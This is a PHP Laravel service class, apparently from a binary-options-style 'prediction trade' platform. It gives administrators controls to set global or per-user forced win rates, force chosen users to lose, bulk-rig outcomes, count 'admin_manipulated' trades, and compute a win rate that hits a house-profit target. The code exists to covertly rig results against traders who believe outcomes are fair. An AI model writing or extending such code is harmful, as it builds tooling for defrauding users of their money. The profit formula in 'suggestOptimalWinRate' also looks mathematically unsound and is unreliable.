<?php

namespace App\Services;

use App\Models\User;
use App\Models\UserTradeControl;
use App\Models\PredictionTrade;
use App\Models\TradeSetting;
use Carbon\Carbon;

class WinRateControlService
{
    /**
     * Set global win rate for all users
     */
    public function setGlobalWinRate(float $winRate): array
    {
        try {
            if ($winRate < 0 || $winRate > 100) {
                return [
                    'success' => false,
                    'message' => 'Win rate must be between 0 and 100'
                ];
            }

            TradeSetting::set('global_win_rate', $winRate, 'Global win rate for trade manipulation');

            return [
                'success' => true,
                'message' => "Global win rate set to {$winRate}%"
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to set global win rate: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Set individual user win rate
     */
    public function setUserWinRate(int $userId, float $winRate): array
    {
        try {
            if ($winRate < 0 || $winRate > 100) {
                return [
                    'success' => false,
                    'message' => 'Win rate must be between 0 and 100'
                ];
            }

            $user = User::findOrFail($userId);
            $controls = UserTradeControl::getForUser($userId);
            
            $controls->setForcedWinRate($winRate);

            return [
                'success' => true,
                'message' => "Win rate for user {$user->name} set to {$winRate}%"
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to set user win rate: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Enable/disable force lose for a user
     */
    public function setUserForceLose(int $userId, bool $forceLose, string $reason = null): array
    {
        try {
            $user = User::findOrFail($userId);
            $controls = UserTradeControl::getForUser($userId);
            
            $controls->enableForceLose($forceLose);
            
            if ($reason && $forceLose) {
                $controls->update(['restriction_reason' => $reason]);
            }

            $status = $forceLose ? 'enabled' : 'disabled';

            return [
                'success' => true,
                'message' => "Force lose {$status} for user {$user->name}"
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to update force lose setting: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Get win rate statistics for analysis
     */
    public function getWinRateStats(int $days = 30): array
    {
        $since = Carbon::now()->subDays($days);
        
        // Global statistics
        $totalTrades = PredictionTrade::where('created_at', '>=', $since)
            ->whereIn('status', ['won', 'lost'])
            ->count();
            
        $wonTrades = PredictionTrade::where('created_at', '>=', $since)
            ->where('status', 'won')
            ->count();
            
        $manipulatedTrades = PredictionTrade::where('created_at', '>=', $since)
            ->where('admin_manipulated', true)
            ->count();

        $globalWinRate = $totalTrades > 0 ? ($wonTrades / $totalTrades) * 100 : 0;

        // User-specific statistics
        $userStats = User::whereHas('predictionTrades', function($query) use ($since) {
                $query->where('created_at', '>=', $since);
            })
            ->withCount([
                'predictionTrades as total_trades' => function($query) use ($since) {
                    $query->where('created_at', '>=', $since)
                          ->whereIn('status', ['won', 'lost']);
                },
                'predictionTrades as won_trades' => function($query) use ($since) {
                    $query->where('created_at', '>=', $since)
                          ->where('status', 'won');
                }
            ])
            ->get()
            ->map(function($user) {
                $winRate = $user->total_trades > 0 ? 
                    ($user->won_trades / $user->total_trades) * 100 : 0;
                
                return [
                    'user_id' => $user->id,
                    'username' => $user->username,
                    'total_trades' => $user->total_trades,
                    'won_trades' => $user->won_trades,
                    'win_rate' => round($winRate, 2)
                ];
            });

        return [
            'global_stats' => [
                'total_trades' => $totalTrades,
                'won_trades' => $wonTrades,
                'lost_trades' => $totalTrades - $wonTrades,
                'global_win_rate' => round($globalWinRate, 2),
                'manipulated_trades' => $manipulatedTrades,
                'manipulation_rate' => $totalTrades > 0 ? round(($manipulatedTrades / $totalTrades) * 100, 2) : 0
            ],
            'user_stats' => $userStats,
            'settings' => [
                'global_win_rate_setting' => TradeSetting::getGlobalWinRate(),
                'manipulation_enabled' => TradeSetting::isManipulationEnabled()
            ]
        ];
    }

    /**
     * Get users with custom win rate settings
     */
    public function getUsersWithCustomWinRates(): \Illuminate\Database\Eloquent\Collection
    {
        return UserTradeControl::whereNotNull('forced_win_rate')
            ->orWhere('force_lose', true)
            ->with('user')
            ->get();
    }

    /**
     * Reset user to global settings
     */
    public function resetUserToGlobal(int $userId): array
    {
        try {
            $user = User::findOrFail($userId);
            $controls = UserTradeControl::getForUser($userId);
            
            $controls->update([
                'forced_win_rate' => null,
                'force_lose' => false,
                'restriction_reason' => null
            ]);

            return [
                'success' => true,
                'message' => "User {$user->name} reset to global win rate settings"
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to reset user settings: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Bulk update win rates for multiple users
     */
    public function bulkSetWinRate(array $userIds, float $winRate): array
    {
        try {
            if ($winRate < 0 || $winRate > 100) {
                return [
                    'success' => false,
                    'message' => 'Win rate must be between 0 and 100'
                ];
            }

            $updatedCount = 0;
            $errors = [];

            foreach ($userIds as $userId) {
                try {
                    $controls = UserTradeControl::getForUser($userId);
                    $controls->setForcedWinRate($winRate);
                    $updatedCount++;
                } catch (\Exception $e) {
                    $errors[] = "Failed to update user {$userId}: " . $e->getMessage();
                }
            }

            return [
                'success' => true,
                'message' => "Updated win rate for {$updatedCount} users",
                'updated_count' => $updatedCount,
                'errors' => $errors
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to bulk update win rates: ' . $e->getMessage()
            ];
        }
    }

    /**
     * Analyze and suggest optimal win rate based on profit targets
     */
    public function suggestOptimalWinRate(float $targetHouseProfitPercent = 15): array
    {
        try {
            // Get recent trade data
            $recentTrades = PredictionTrade::where('created_at', '>=', Carbon::now()->subDays(30))
                ->whereIn('status', ['won', 'lost'])
                ->get();

            if ($recentTrades->isEmpty()) {
                return [
                    'success' => false,
                    'message' => 'No recent trade data available for analysis'
                ];
            }

            $totalTradeVolume = $recentTrades->sum('trade_amount');
            $totalPayouts = $recentTrades->where('status', 'won')->sum('actual_payout');
            $currentHouseProfit = $totalTradeVolume - $totalPayouts;
            $currentProfitPercent = ($currentHouseProfit / $totalTradeVolume) * 100;

            // Calculate optimal win rate
            $payoutRate = TradeSetting::getDefaultPayout() / 100;
            $optimalWinRate = ((100 - $targetHouseProfitPercent) / $payoutRate);

            return [
                'success' => true,
                'analysis' => [
                    'total_trade_volume' => $totalTradeVolume,
                    'total_payouts' => $totalPayouts,
                    'current_house_profit' => $currentHouseProfit,
                    'current_profit_percent' => round($currentProfitPercent, 2),
                    'target_profit_percent' => $targetHouseProfitPercent,
                    'suggested_win_rate' => round($optimalWinRate, 2),
                    'current_payout_rate' => TradeSetting::getDefaultPayout()
                ],
                'recommendation' => $optimalWinRate > 0 && $optimalWinRate <= 100 ?
                    "Set win rate to " . round($optimalWinRate, 2) . "% to achieve {$targetHouseProfitPercent}% house profit" :
                    "Target profit percent may not be achievable with current payout rates"
            ];

        } catch (\Exception $e) {
            return [
                'success' => false,
                'message' => 'Failed to analyze optimal win rate: ' . $e->getMessage()
            ];
        }
    }
}
